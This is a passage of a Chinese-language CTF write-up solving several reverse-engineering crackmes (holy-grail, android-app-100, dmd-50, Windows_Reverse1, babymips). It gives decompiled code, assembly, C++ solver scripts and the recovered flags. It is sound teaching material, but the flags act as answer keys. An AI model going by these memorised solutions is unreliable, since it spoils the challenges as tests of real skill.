class="hljs-keyword">if</span> (i == <span class="hljs-number">18</span>) {</span><br><span class="line">            a1[i] = str[<span class="hljs-number">18</span>] ^ <span class="hljs-number">0x13</span>;</span><br><span class="line"></span><br><span class="line">        }</span><br><span class="line">        <span class="hljs-keyword">if</span> (i % <span class="hljs-number">2</span>) {</span><br><span class="line">            a1[i] = (str[i] ^ i) + i;</span><br><span class="line">        } <span class="hljs-keyword">else</span> {</span><br><span class="line">            a1[i + <span class="hljs-number">2</span>] = (str[i] ^ i);</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    a1[<span class="hljs-number">0</span>]=<span class="hljs-string">'f'</span>;</span><br><span class="line">    cout &lt;&lt; a1 &lt;&lt; endl;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>这里有一点需要注意，这个程序是没法检测第一位输入的，中间的过程也完全没有用到第一位，所以根据输出结果手动添加了’f’，输出</p><figure class="highlight apache hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attribute">flag</span>{Ho<span class="hljs-number">0</span>k_w<span class="hljs-number">1</span>th_Fun}</span><br></pre></td></tr></tbody></table></figure><p>可以验证一下，第一位其实并不影响结果</p><p><img src="https://s2.ax1x.com/2020/02/14/1XU7IP.png" alt="EASYHOOK-1"></p><p>发现第一位改成其他的字符也是正确的</p><h4 id="reverse-for-the-holy-grail-350"><a href="#reverse-for-the-holy-grail-350" class="headerlink" title="reverse-for-the-holy-grail-350"></a>reverse-for-the-holy-grail-350</h4><p>这题还算是比较简单的题目，很容易就可以找到关键函数，然后发现所有的数据处理和验证全部都在这个函数里面</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">stringMod</span><span class="hljs-params">(__int64 *a1)</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  __int64 v1; <span class="hljs-comment">// r9</span></span><br><span class="line">  __int64 v2; <span class="hljs-comment">// r10</span></span><br><span class="line">  __int64 i; <span class="hljs-comment">// rcx</span></span><br><span class="line">  <span class="hljs-keyword">signed</span> <span class="hljs-keyword">int</span> v4; <span class="hljs-comment">// er8</span></span><br><span class="line">  <span class="hljs-keyword">int</span> *v5; <span class="hljs-comment">// rdi</span></span><br><span class="line">  <span class="hljs-keyword">int</span> *v6; <span class="hljs-comment">// rsi</span></span><br><span class="line">  <span class="hljs-keyword">signed</span> <span class="hljs-keyword">int</span> v7; <span class="hljs-comment">// ecx</span></span><br><span class="line">  <span class="hljs-keyword">signed</span> <span class="hljs-keyword">int</span> v8; <span class="hljs-comment">// er9</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v9; <span class="hljs-comment">// er10</span></span><br><span class="line">  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> v10; <span class="hljs-comment">// eax</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v11; <span class="hljs-comment">// esi</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v12; <span class="hljs-comment">// esi</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v14[<span class="hljs-number">24</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-60h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> _48[<span class="hljs-number">24</span>]; <span class="hljs-comment">// [rsp+48h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  <span class="hljs-built_in">memset</span>(v14, <span class="hljs-number">0</span>, <span class="hljs-number">0x48</span>uLL);</span><br><span class="line">  v1 = a1[<span class="hljs-number">1</span>];</span><br><span class="line">  <span class="hljs-keyword">if</span> ( v1 )</span><br><span class="line">  {</span><br><span class="line">    v2 = *a1;</span><br><span class="line">    i = <span class="hljs-number">0LL</span>;</span><br><span class="line">    v4 = <span class="hljs-number">0</span>;</span><br><span class="line">    <span class="hljs-keyword">do</span></span><br><span class="line">    {</span><br><span class="line">      v12 = *(<span class="hljs-keyword">char</span> *)(v2 + i);</span><br><span class="line">      v14[i] = v12;</span><br><span class="line">      <span class="hljs-keyword">if</span> ( <span class="hljs-number">3</span> * ((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)i / <span class="hljs-number">3</span>) == (_DWORD)i &amp;&amp; v12 != firstchar[(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)i / <span class="hljs-number">3</span>] )<span class="hljs-comment">// 3的倍数等于firstchar</span></span><br><span class="line">        v4 = <span class="hljs-number">-1</span>;</span><br><span class="line">      ++i;</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">while</span> ( i != v1 );</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">else</span></span><br><span class="line">  {</span><br><span class="line">    v4 = <span class="hljs-number">0</span>;</span><br><span class="line">  }</span><br><span class="line">  v5 = v14;</span><br><span class="line">  v6 = v14;</span><br><span class="line">  v7 = <span class="hljs-number">666</span>;</span><br><span class="line">  <span class="hljs-keyword">do</span></span><br><span class="line">  {</span><br><span class="line">    *v6 = v7 ^ *(<span class="hljs-keyword">unsigned</span> __int8 *)v6;</span><br><span class="line">    v7 += v7 % <span class="hljs-number">5</span>;</span><br><span class="line">    ++v6;</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">while</span> ( _48 != v6 );</span><br><span class="line">  v8 = <span class="hljs-number">1</span>;</span><br><span class="line">  v9 = <span class="hljs-number">0</span>;</span><br><span class="line">  v10 = <span class="hljs-number">1</span>;</span><br><span class="line">  v11 = <span class="hljs-number">0</span>;</span><br><span class="line">  <span class="hljs-keyword">do</span></span><br><span class="line">  {</span><br><span class="line">    <span class="hljs-keyword">if</span> ( v11 == <span class="hljs-number">2</span> )</span><br><span class="line">    {</span><br><span class="line">      <span class="hljs-keyword">if</span> ( *v5 != thirdchar[v9] )</span><br><span class="line">        v4 = <span class="hljs-number">-1</span>;</span><br><span class="line">      <span class="hljs-keyword">if</span> ( v10 % *v5 != masterArray[v9] )</span><br><span class="line">        v4 = <span class="hljs-number">-1</span>;</span><br><span class="line">      ++v9;</span><br><span class="line">      v10 = <span class="hljs-number">1</span>;</span><br><span class="line">      v11 = <span class="hljs-number">0</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">else</span></span><br><span class="line">    {</span><br><span class="line">      v10 *= *v5;</span><br><span class="line">      <span class="hljs-keyword">if</span> ( ++v11 == <span class="hljs-number">3</span> )</span><br><span class="line">        v11 = <span class="hljs-number">0</span>;</span><br><span class="line">    }</span><br><span class="line">    ++v8;</span><br><span class="line">    ++v5;</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">while</span> ( v8 != <span class="hljs-number">19</span> );</span><br><span class="line">  <span class="hljs-keyword">return</span> (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)(v7 * v4);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>发现把输入分成了三个部分，处理起来也很简单，写脚本处理</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">int</span> firstchar[<span class="hljs-number">8</span>] =</span><br><span class="line">            {<span class="hljs-number">65</span>, <span class="hljs-number">105</span>, <span class="hljs-number">110</span>, <span class="hljs-number">69</span>, <span class="hljs-number">111</span>, <span class="hljs-number">97</span>};</span><br><span class="line">    <span class="hljs-keyword">int</span> thirdchar[<span class="hljs-number">8</span>] =</span><br><span class="line">            {<span class="hljs-number">751</span>, <span class="hljs-number">708</span>, <span class="hljs-number">732</span>, <span class="hljs-number">711</span>, <span class="hljs-number">734</span>, <span class="hljs-number">764</span>};</span><br><span class="line">    <span class="hljs-keyword">int</span> masterArray[<span class="hljs-number">6</span>] =</span><br><span class="line">            {<span class="hljs-number">471</span>, <span class="hljs-number">12</span>, <span class="hljs-number">580</span>, <span class="hljs-number">606</span>, <span class="hljs-number">147</span>, <span class="hljs-number">108</span>};</span><br><span class="line">    <span class="hljs-keyword">int</span> xor_[<span class="hljs-number">24</span>] = {<span class="hljs-number">0</span>};</span><br><span class="line">    <span class="hljs-keyword">char</span> flag[<span class="hljs-number">24</span>] = {<span class="hljs-number">0</span>};</span><br><span class="line">    xor_[<span class="hljs-number">0</span>] = <span class="hljs-number">666</span>;</span><br><span class="line">    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt; <span class="hljs-number">24</span>; i++) {</span><br><span class="line">        xor_[i] = xor_[i - <span class="hljs-number">1</span>] + xor_[i - <span class="hljs-number">1</span>] % <span class="hljs-number">5</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">6</span>; i++) {</span><br><span class="line">        flag[<span class="hljs-number">3</span> * i] = firstchar[i];</span><br><span class="line">        flag[<span class="hljs-number">3</span> * i + <span class="hljs-number">2</span>] = thirdchar[i] ^ xor_[<span class="hljs-number">3</span> * i + <span class="hljs-number">2</span>];</span><br><span class="line">        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">48</span>; j &lt; <span class="hljs-number">122</span>; j++) {</span><br><span class="line">            <span class="hljs-keyword">if</span> ((j &gt;= <span class="hljs-number">48</span> &amp;&amp; j &lt;= <span class="hljs-number">57</span>) || (j &gt;= <span class="hljs-number">65</span> &amp;&amp; j &lt;= <span class="hljs-number">90</span>) || (j &gt;= <span class="hljs-number">97</span> &amp;&amp; j &lt;= <span class="hljs-number">122</span>)) {</span><br><span class="line">                <span class="hljs-keyword">int</span> tmp = j ^xor_[<span class="hljs-number">3</span> * i + <span class="hljs-number">1</span>];</span><br><span class="line">                <span class="hljs-keyword">if</span> (tmp * (flag[<span class="hljs-number">3</span> * i] ^ xor_[<span class="hljs-number">3</span> * i]) % thirdchar[i] == masterArray[i]) {</span><br><span class="line">                    flag[<span class="hljs-number">3</span> * i + <span class="hljs-number">1</span>] = j;</span><br><span class="line">                    <span class="hljs-keyword">break</span>;</span><br><span class="line">                }</span><br><span class="line">            } <span class="hljs-keyword">else</span></span><br><span class="line">                <span class="hljs-keyword">continue</span>;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    cout &lt;&lt; flag &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>输出flag，再套上<code>main</code>里面提供的格式即可</p><figure class="highlight dust hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-xml">tuctf</span><span class="hljs-template-variable">{AfricanOrEuropean?}</span></span><br></pre></td></tr></tbody></table></figure><h4 id="android-app-100"><a href="#android-app-100" class="headerlink" title="android-app-100"></a>android-app-100</h4><p>反编译之后发现还调用了c的库，于是IDA打开so文件，看到了混淆，但是内容比较好猜，所以直接找到字符串计算md5或者在apk里面提交就好了</p><figure class="highlight apache hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attribute">Sharif_CTF</span>(<span class="hljs-number">833489</span>ef<span class="hljs-number">285</span>e<span class="hljs-number">6</span>fa<span class="hljs-number">80690099</span>efc<span class="hljs-number">5</span>d<span class="hljs-number">9</span>c<span class="hljs-number">9</span>d)</span><br></pre></td></tr></tbody></table></figure><h4 id="dmd-50"><a href="#dmd-50" class="headerlink" title="dmd-50"></a>dmd-50</h4><p>打开直接找到输入的flag的md5值，md5解密找到flag</p><figure class="highlight llvm hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b<span class="hljs-number">781</span>cbb<span class="hljs-number">29054</span>db<span class="hljs-number">12</span>f<span class="hljs-number">88</span>f<span class="hljs-number">08</span><span class="hljs-keyword">c</span><span class="hljs-number">6e161</span><span class="hljs-keyword">c</span><span class="hljs-number">199</span></span><br></pre></td></tr></tbody></table></figure><h4 id="Windows-Reverse1"><a href="#Windows-Reverse1" class="headerlink" title="Windows_Reverse1"></a>Windows_Reverse1</h4><p>这道题很有意思，首先查壳，发现是upx，直接脱壳，IDA打开，F5查看</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  <span class="hljs-keyword">char</span> v4; <span class="hljs-comment">// [esp+4h] [ebp-804h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v5; <span class="hljs-comment">// [esp+5h] [ebp-803h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v6; <span class="hljs-comment">// [esp+404h] [ebp-404h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> Dst; <span class="hljs-comment">// [esp+405h] [ebp-403h]</span></span><br><span class="line"></span><br><span class="line">  v6 = <span class="hljs-number">0</span>;</span><br><span class="line">  <span class="hljs-built_in">memset</span>(&amp;Dst, <span class="hljs-number">0</span>, <span class="hljs-number">0x3FF</span>u);</span><br><span class="line">  v4 = <span class="hljs-number">0</span>;</span><br><span class="line">  <span class="hljs-built_in">memset</span>(&amp;v5, <span class="hljs-number">0</span>, <span class="hljs-number">0x3FF</span>u);</span><br><span class="line">  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"please input code:"</span>);</span><br><span class="line">  <span class="hljs-built_in">scanf</span>(<span class="hljs-string">"%s"</span>, &amp;v6);</span><br><span class="line">  <span class="hljs-built_in">sub_401000</span>(&amp;v6);</span><br><span class="line">  <span class="hljs-keyword">if</span> ( !<span class="hljs-built_in">strcmp</span>(&amp;v4, <span class="hljs-string">"DDCTF{reverseME}"</span>) )</span><br><span class="line">    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"You've got it!!%s\n"</span>, &amp;v4);</span><br><span class="line">  <span class="hljs-keyword">else</span></span><br><span class="line">    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Try again later.\n"</span>);</span><br><span class="line">  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>表面上看我们需要输入一个字符串，然后经过<code>sub_401000</code>的变换之后变成<code>DDCTF{reverseME}</code>，然后查看一下加密函数</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">sub_401000</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  _BYTE *v1; <span class="hljs-comment">// ecx</span></span><br><span class="line">  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> v2; <span class="hljs-comment">// edi</span></span><br><span class="line">  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> result; <span class="hljs-comment">// eax</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v4; <span class="hljs-comment">// ebx</span></span><br><span class="line"></span><br><span class="line">  v2 = <span class="hljs-number">0</span>;</span><br><span class="line">  result = <span class="hljs-built_in">strlen</span>(a1);</span><br><span class="line">  <span class="hljs-keyword">if</span> ( result )</span><br><span class="line">  {</span><br><span class="line">    v4 = a1 - v1;</span><br><span class="line">    <span class="hljs-keyword">do</span></span><br><span class="line">    {</span><br><span class="line">      *v1 = byte_402FF8[(<span class="hljs-keyword">char</span>)v1[v4]];</span><br><span class="line">      ++v2;</span><br><span class="line">      ++v1;</span><br><span class="line">      result = <span class="hljs-built_in">strlen</span>(a1);</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">while</span> ( v2 &lt; result );</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">return</span> result;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>看起来是一个换表操作，但是在这里遇到了两个让人疑惑的事情，第一个，我们输入的字符串是怎么传入这个函数里面来的，第二个，在<code>0x402FF8</code>处什么都没有，这个表在哪里</p><p>所以还是需要仔细看看汇编代码</p><figure class="highlight plaintext hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">.text:004010A4   lea     edx, [esp+824h+var_404]</span><br><span class="line">.text:004010AB                 push    edx</span><br><span class="line">.text:004010AC                 push    offset aS       ; "%s"</span><br><span class="line">.text:004010B1                 call    ds:scanf</span><br><span class="line">.text:004010B7                 lea     eax, [esp+82Ch+var_404]</span><br><span class="line">.text:004010BE                 push    eax</span><br><span class="line">.text:004010BF                 lea     ecx, [esp+830h+var_804]</span><br><span class="line">.text:004010C3                 call    sub_401000</span><br><span class="line"></span><br><span class="line">.text:00401000 sub_401000      proc near               ; CODE XREF: _main+73↓p</span><br><span class="line">.text:00401000</span><br><span class="line">.text:00401000 arg_0           = dword ptr  4</span><br><span class="line">.text:00401000</span><br><span class="line">.text:00401000                 push    ecx</span><br><span class="line">.text:00401001                 push    ebp</span><br><span class="line">.text:00401002                 mov     ebp, [esp+8+arg_0]</span><br><span class="line">.text:00401006                 push    esi</span><br><span class="line">.text:00401007                 mov     eax, ebp</span><br><span class="line">.text:00401009                 push    edi</span><br><span class="line">.text:0040100A                 xor     edi, edi</span><br><span class="line">.text:0040100C                 lea     esi, [eax+1]</span><br><span class="line">.text:0040100F                 nop</span><br></pre></td></tr></tbody></table></figure><p>这里应该是人为修改了代码，可以看到我们输入的字符串地址被赋给了<code>ecx</code>，然后再我们的解密函数最开始，先把<code>ecx</code>里面的值压进了栈，所以这个函数用了<code>ecx</code>寄存器来传参，而这是个32位的程序，所以IDA这里检测的时候出现了一点问题，第一个问题解决了，再看看第二个，先来研究里面的索引值</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">if</span> ( result )</span><br><span class="line">  {</span><br><span class="line">    v4 = a1 - v1;</span><br><span class="line">    <span class="hljs-keyword">do</span></span><br><span class="line">    {</span><br><span class="line">      *v1 = byte_402FF8[(<span class="hljs-keyword">char</span>)v1[v4]];</span><br><span class="line">      ++v2;</span><br><span class="line">      ++v1;</span><br><span class="line">      result = <span class="hljs-built_in">strlen</span>(a1);</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">while</span> ( v2 &lt; result );</span><br><span class="line">  }</span><br></pre></td></tr></tbody></table></figure><p><code>v1[v4]</code>这个表达形式可以看得出来就是<code>a1</code>的首地址，而<code>a1</code>就是我们输入的字符串，都是可见字符，所以每个字符的值都要大于32，所以在<code>0x402FF8</code>这个位置向下偏移至少32的位置寻找，找到了真正的字母表</p><p>分析结束，可以直接动手逆向了，不过在导出这个字母表的时候很凑巧的发现这个字母表的值刚好是从126-32的排列，这说明我们输入的和变换出来的值相加正好为158，这就提供了一个更简单的逆向思路</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{</span><br><span class="line">    string target = <span class="hljs-string">"DDCTF{reverseME}"</span>;</span><br><span class="line">    string flag = <span class="hljs-string">""</span>;</span><br><span class="line">    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; target.<span class="hljs-built_in">length</span>(); i++) {</span><br><span class="line">        flag += <span class="hljs-number">158</span> - target[i];</span><br><span class="line">    }</span><br><span class="line">    cout &lt;&lt; flag &lt;&lt; endl;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>输出套上flag即可</p><figure class="highlight apache hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attribute">ZZ</span>[JX#,<span class="hljs-number">9</span>(<span class="hljs-number">9</span>,+<span class="hljs-number">9</span>QY!</span><br></pre></td></tr></tbody></table></figure><h4 id="babymips"><a href="#babymips" class="headerlink" title="babymips"></a>babymips</h4><p>这个题本身没有什么，很简单的算法，也没有什么加密、加壳，主要是有些受不了IDA+Retdec反汇编出来的代码，所以试了一下Ghidra</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">FUN_004009a8</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span></span><br><span class="line"><span class="hljs-function"></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  <span class="hljs-keyword">int</span> iVar1;</span><br><span class="line">  <span class="hljs-keyword">int</span> iStack48;</span><br><span class="line">  byte abStack44 [<span class="hljs-number">36</span>];</span><br><span class="line">  </span><br><span class="line">  <span class="hljs-built_in">setbuf</span>(stdout,(<span class="hljs-keyword">char</span> *)<span class="hljs-number">0x0</span>);</span><br><span class="line">  <span class="hljs-built_in">setbuf</span>(stdin,(<span class="hljs-keyword">char</span> *)<span class="hljs-number">0x0</span>);</span><br><span class="line">  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Give me your flag:"</span>);</span><br><span class="line">  <span class="hljs-built_in">scanf</span>(<span class="hljs-string">"%32s"</span>,abStack44);</span><br><span class="line">  iStack48 = <span class="hljs-number">0</span>;</span><br><span class="line">  <span class="hljs-keyword">while</span> (iStack48 &lt; <span class="hljs-number">0x20</span>) {</span><br><span class="line">    abStack44[iStack48] = abStack44[iStack48] ^ <span class="hljs-number">0x20</span>U - (<span class="hljs-keyword">char</span>)iStack48;</span><br><span class="line">    iStack48 = iStack48 + <span class="hljs-number">1</span>;</span><br><span class="line">  }</span><br><span class="line">  iVar1 = <span class="hljs-built_in">strncmp</span>((<span class="hljs-keyword">char</span> *)abStack44,_fdata,<span class="hljs-number">5</span>);</span><br><span class="line">  <span class="hljs-keyword">if</span> (iVar1 == <span class="hljs-number">0</span>) {</span><br><span class="line">    <span class="hljs-built_in">FUN_004007f0</span>(abStack44);</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">else</span> {</span><br><span class="line">    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Wrong"</span>);</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">return</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>首先是输入flag，然后进行一个变换，先比较前5位，如果一致进入下一个变换</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">FUN_004007f0</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *param_1)</span></span></span><br><span class="line"><span class="hljs-function"></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  <span class="hljs-keyword">size_t</span> sVar1;</span><br><span class="line">  <span class="hljs-keyword">int</span> iVar2;</span><br><span class="line">  uint uStack16;</span><br><span class="line">  </span><br><span 